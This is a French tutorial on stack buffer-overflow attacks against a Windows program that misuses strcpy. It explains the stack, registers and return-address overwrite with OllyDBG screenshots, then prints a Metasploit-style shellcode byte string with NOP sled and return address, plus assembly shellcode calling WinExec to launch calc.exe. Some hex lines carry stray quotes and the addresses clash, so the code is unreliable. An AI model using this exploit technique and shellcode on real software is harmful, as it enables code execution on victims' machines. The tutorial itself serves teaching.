#Buffer-Overflow Attack.

\sub### Préface du buffer-overflow

Enormément répandu de nos jours sur internet, becaucoup de tutos plus ou moins explicatif alimente le sujet, ici nous allons pas **hacker** le FBI, mais comprendre ses rouages et ses fonctionnements. Très souvent les attack de type **buffer-overflow** descend d'un default de conception, ou une mauvaise gestion de la mémoire. Petite illustration *homemade* : 

[img:./test/img/bob.png](auto) 

Ainsi d'une vue global, on peut représenter cette **attack** par cette image simplement, nous avons **Bob** qui est note boulanger préférer qui mis à notre disposition une cuve d'une contenace max de [c:10 litres](blue), bien entendu le patron de **Bob** à oublié de lui demandé de verifier chaque contenu qui va y être versé, donc chaccun est libre d'y verser ce que bon lui semble. Alors quand **Alice** vient y verser les 50 litres évidament la cuve déborde catastrophe, est comme cette eau est magique nous y avions mixer quelques molécules qui nous permettra d'hypnotiser **Bob** est de lui demander éxécuter quelques ordres lorsque celle-ci débordera.

Bien sûr cela est bien plus complexe, comme je vais prendre l'example le plus facile la function **strcpy[sup:c++]** cette function permet de copier une chaine de caractères dans un nouveaux buffer voici sont [code:prototype] 

\prototype void strcpy( char *  buffer_dst , const_char * origin ) 

quel rapport avec **Bob** ?

L'histoire de tout à l'heure avec **Bob** tourner autour de contenus est de contenance et de non vérification de celle-ci. Est bien la function **strcpy** fait pareille elle [c:ne vérifie pas la taille de la $ chaîne d'origine $ à copier et de la capaciter d'acceuil du nouveaux $buffer$](red), si **Bob** nous donne un ** buffer ** d'une capacité de 10 caractères et qu'**Alice**  *( origin )* y glisse 20 caractères la machine déborde ^^. Ce qui est similiaire à l'histoire précédante.

###:question:Alors sa déborde mais ou va le débordement ? 

\sub#### La Stack

Lors de l'éxécution d'un programme, l'ordinateur va lui allouer une petite zone de mémoire que l'on appel la **Stack** *( la Pile )* cette stack va être utilisé pour y stocker des informations tempraire, pour sont bon fonctionnement. Par example lorsque que l'on appel une function avec des arguments en paramètres comme pour la function **strcpy** les addresses mémoires des variable y seront déposer sur la **pile** pour y être utlisé ultérieurement puis sera supprimer de la pile. Ou alors  au seins même d'une function et que celle-ci appelle une autre function elle ira déposer l'addresse mémoire du registre **EIP** que l'on appellera  ** addresse retour** cette addresse est l'indicateur de ou le programme c'était arrêter précédamment afin qu'il puisse sauter à cette addresse pour ne pas se perdre dans le déroulement de sont processus. Bien entendu la Pile est un endroit, bien ranger bien structuré, ou l'anarchie n'as pas sa place ;) alors quand des ***hippie*** comme dirait Eric Cartman ^^ viennent y mettre leurs grains de sel cela peut le perturber.  

\sub#### Les Registres

Aussi pour son bon fonctionnnement lors de sont déroulement le programme aura des registres ou chaccun à son utilisation bien particulière comme pour les registre **EBP** eyt **ESP** l'un contient l'address mémoire du [c:haut](green) de la pile est l'un addresse mémoire du [c:bas](red) de la pile. **EIP** contient l'addresse de la line ou bien encore ( [code:*opcode*] ) à éxécuter pour le processeur. chaccun des registres pointe sur un segment *( portion ) * de mémoire.

\sub#### La segmentation de la mémoire

Lors du lancemement le programme sera segmenter en plusieur partie, une partie sera le code dit exécutable, une autre contient les variables ainsi de suite..., chaccun à ce sa petite zone de confort, et n'as pas de réelle intérêt à aller enpiéter chez sont voisin. 

box> Alors tous cette orchestre fonctionne comme une holorge suisse, mais voila de la rouille peut venir gripper le mécanisme et faire sauter la partition.    

Revenons à nos function **strcpy** est regardons le code ci-dessous :

[img:./test/img/vulcpp.png]( auto ) 

il existe pas plus basic deux function le **main** et **buffer_cpy** analysons **buffer_cpy** la function alloue un buffer de [c:\[160\]](blue) ***(bytes)*** caractères, appelle la function **strcpy** qui va copier la chaine passé en arguments *(tmp)*  dans le buffer *(cbuf)* puis l'afficher à écran.

la function **main** récupère la chaîne de caractère entré par utilisateur puis appelle la function  **buffer_cpy**, nous avons vu que le buffer d'acceuil est relativement faible, la function ne vérifie pas la taille de la chaine reçus et que **strcpy** fait de même. Alors quand on rentre une chiane supérieur à 160 caractère comment réagi **Roger**, cela rappelera des souvenirs notamenet sur **windows XP**. 

[img:./test/img/vul.png]( auto )

\sub###Ou est-ce que sa coince ?

A l'époque j'utiliser **OllyDBG** ou **win32asm/winDasm** *(RIP)* tuto n'est pas jeune, mais est un bon moyen de comprendre, ouvrons donc **OllyDBG** 
et cherchons la function **buffer_cpy** :

[img:./test/img/fct_cpy.png](auto)

|: Address Mémoire :|: comments :|
|: [tt:x00401334] |: Entré de la function, stock l'addresse de la pile sur la pile |
|: [tt:x00401335] - [tt:x00401337] |: [tt:Préparation de la pile ou **stack**] |
|: [tt:x0040133D] - [tt:x0040134A]  |: push les arguments sur la pile |
|: [tt:$**x0040134D**$] |: Appel de la function **strcpy** |
|: [tt:$**x00401368**$] |: **LEAVE** libére la pile donc **EBP** pointe ver **Address retour**  |
|: [tt:x00401369] |: Sorti de la function &rarr; [c:**RET**](green) |

\sub###:one: First test avec une chaine normal.  

silver> **"Charles carmicheal"** &rarr; hexa &rarr;  **[vscanf:%h](Charles carmicheal)**

\hexdumpCharles carmicheal

Analysons l'état de la pile : 

[img:./test/img/Stack_buff.png]
[...]
[img:./test/img/Stack_buf0.png] 

|: Address Mémoire :|: contenu :|: comment |
|: [tt:x0020FB70] |: pointeur vers l'addresse [tt:x0020FB80] | Notre chaine |
|: [tt:x0020FB80] == **EBP** bas de la pile à [tt:x0020FB90] |: Notre chaine | Charles carmicheal  |
|: [...] |: buffer | Nous avons un buffer de [c:160 bytes](blue) + 12 bytes  |
|: [tt:x0020FC02] == **ESP** haut de la pile |: Addresse de retour | précédament stocké sur la pile pointeur &rarr; [tt:$x0040134D$]  |

box> ( [tt:x0020FB80] *EBP*  + [tt:xAC][sup:*(160+12)d*] ) = [tt:x0020FC02] *ESP*


\sub###:two: Deuxième test avec une chaine overflow.

La chaine contient ** 255 ** caractère soit un dépassement de ( 255 - [c: 160 ](blue)  ) = ** 95 ** caractères.

silver> SIoTLuVFZ2S7LOv7t29HZmwrzaLldnnInZDLMQDXnULv13EGQqq09x56FR0SqbjfuGCKte59BBKMwYuU1Wk0Kh0laqfbkPWgprL8 kdCOKzteM9KWo8r8HDBdmT7tGo6Ve4QJYDkMoPnQIj2X85izYqEvSV18SWOpDkHLZP1eLQw2$**n9DH**$Gkhf8i8omjz4gt3L8nPyFGYMG u9oYuYJ0piLZbopwKFK34a3NgPU4WDoNwqcn37OiMmYC7bFwFsMl3C

Puis Analysons l'état de la pile, mais nous pouvons déjà en déduire sont **addresse retour** elle se trouve à **EBP** + 172  :

[img:.//test/img/Stack_buf1.png]

Dans cette image notre buffer commence à l'addresse [tt:x0020FB90] donc :

box> [tt:x0020FB90] + [c:[tt:xA0]](blue) = [tt:x0022FC3C] 

[img:./test/img/Stack_buf2.png] 

	* **EBP** &rarr; [tt:x0022FB88] 
	* Buffer &rarr; [tt:x0022FB90] 
	* AddrRet &rarr; [tt:x0022FB3C] 
	* Fin du hash &rarr; [tt:x0022FC8C] 

Récapitulons, Utilisateur entre une chaine de caractère de taille supérieur à [c: 160 ](blue), la function **main** va appller la function **buffer_cpy** avec en paramètre notre chaine, nous arrivons à **strcpy** qui va copier la chaine dans le nouveau $buffer qui lui pour le moment est stocker sur la pile le temps de son traitement$  malgrès la chaine qui est supérieur à 160 ne va pas étendre sa mémoire pour autant il va tout simplement $réécrire par desus cette mémoire$, donc les éléments utile comme notre **addresse retour** a été modifier par le contenu de notre chaine de caractères. Ainsi lors de la libération de cette mémoire [code:opcode [tt:**LEAVE**] ] le registre **EIP** pointera vers une **addresse retour**  totalement [c:inexistante](red), ce qui va créé ce fameux rapport de plantage !   

\sub###L'exploitation

Bon voila vous allez me dire la machine à planter quels sont les rique réels ? Eh bien le but maintenant avec notre chaine de caractère au lieu de mettre de quelconque lettre aléatoire nous allons y placer du language machine appellé **Shellcode** puis modifier l'**addresse retour**, pour que celle-ci pointe sur la pile à l'addresse de départ de notre **buffer**, l'espace disponible est de [c: 172](blue) bytes + [c: 4](blue) bytes pour **addresse de retour** qui est &rarr; [tt:x0022FB90]. Qand **EIP** arrivera à cette addresse le processeur va lire le contenu de la pile comme du code éxécutable, alors qu'a la base la pile n'est pas destiné comme espace d'éxécution mais comme espace pour y sotcker des donnés. Ce petit bout de code éxécutable injecté est libre de création selon le **hacker** et ses motivations, mais attention certaines contraintes sont à surmonter lors de sa création.   

[img:./test/img/sa.png] 

\sub####Shellcode de Metasploit

\shell
"\x33\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6b"
"\x27\x3d\x46\x83\xeb\xfc\xe2\xf4\x97\xcf\x79\x46"\x6b\x27\xb6\x03"
"\x57\xac\x41\x43"\x13\x26\xd2\xcd\x24\x3f\xb6\x19"\x4b\x26\xd6\x0f"
"\xe0\x13\xb6\x47\x85\x16\xfd\xdf\xc7\xa3\xfd\x32\x6c\xe6\xf7\x4b"
"\x6a\xe5\xd6\xb2\x50\x73\x19\x42\x1e\xc2\xb6\x19\x4f\x26\xd6\x20"
"\xe0\x2b\x76\xcd\x34\x3b\x3c\xad\xe0\x3b\xb6\x47\x80\xae\x61\x62"
"\x6f\xe4\x0c\x86"\x0f\xac\x7d\x76\xee\xe7\x45\x4a\xe0\x67\x31\xcd"
"\x1b\x3b\x90\xcd\x03\x2f\xd6\x4f\xe0\xa7\x8d\x46\x6b\x27\xb6\x2e"
"\x57\x78\x0c\xb0\x0b\x71\xb4\xbe\xe8\xe7\x46\x16\x03\xd7\xb7\x42"
"\x34\x4f\xa5\xb8\xe1\x29\x6a\xb9\x8c\x44\x5c\x2a\x08\x09\x58\x3e"
"\x0e\x27\x3d\x46"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\xfb\x22\x00"; -> EIP 
\\

\sub####l'injection en cours éxécution *(Metasploit)* : 
[img:./test/img/exec.png]( auto ) 

###Les Shellcodes

Les **shellcodes** sont une suite d'instruition ou opcode qui représente du language machine fait pour la machine. Alors il ya deux écoles soit vous allez farfouiller les sites de sécuriter informatique ou bien vous avez les connaissances requise en assembleur est en **API** de l'os en question, pour vous lancer à corp perdu dans la conception d'un **shellcode**, dans cette example le shellcode n'est pas ouf *it's myself* il est très vieux, j'ai eu t'autres loisirs que l'assembleur un moment de ma vie :). Mais il existe de type de shellcode

	* Portatif
	* Non portatif

L'un peut s'exporter au delà de son environement, l'autre non il est cantonné à sont environement, pourquoi ça ?

Etant donné que notre **shellcode** n'emporte pas avec lui beaucoup de bagage pour faire des exploits, il va tous simplement falloir solliciter **API** de l'os en question, car c'est pas avec 172 bytes que vous allez pouvoir développer en toute quiétude. Il va juste nous servir de tremplin ou porte dérobé pour des utilisation futurs. Dans la grande majorité des examples les **shellcode** esseye de lancer la calculatrice à l'aide de la function **winexec** de **API** Windows qui se trouve dans la librairie (DLL) **kernel32.dll**, cette librairie est loader par *default* dans chaque application. C'est ici que mainteant va ce différencier entre le poratif et le non portatif.

\sub###Comment accèder à cette function 

Alors dans les 80's, les **os** mappé en mémoire leurs librairies toujours au même emplacement aux même addresses mémoire, ainsi dans mon **Windows NT** ^^, la function **winExec* était à la même addresse que sur ton **Windows NT** chez toi. Donc lors de la créarion du shellcode pour appeler **winExec** il suffiser d'indiquer sont addresse mémoire, le shellcode été fonctionnelle autant chez moi que chez toi.

Mais pour compliquer cette tâche les ingénieurs ont décidé de randomiser tous cela, et de mapper ces librairies en mémoire à des addresses aléatoire à chaque redémarrage de **Roger**, ce qui rend la tâche bien plus hardue que dans les eighteen's. Pour windows une méthode existe qui consiste à remonter la Structure du **PEB/TEB** via le segment **FS**. Bien évidamment pour ma part je me suis pas trop foulé la pomme j'ai opté pour cette méthode :

[img:./test/img/offsetdll.png]( 837 * , auto )

box> :warning: [c:Attention un shellcocde ne doit en auccun cas comporter de valeur \x00](red) 
 



\shell
; # shell_exploit #
;
;   buffer_overflow
	section .text 

	xor eax,eax	
	mov ebp,eax
	mov dword[esp-0x14],eax
	mov dword[esp-0x08],eax	
	inc eax
	lea ebx,[esp-0x10]
	
	mov edi,0x775AE695
	mov dword[esp],ebx
	mov dword[esp+0x04],eax
	call edi 
	
	section .data
	calc db "calc.exe",0
\\

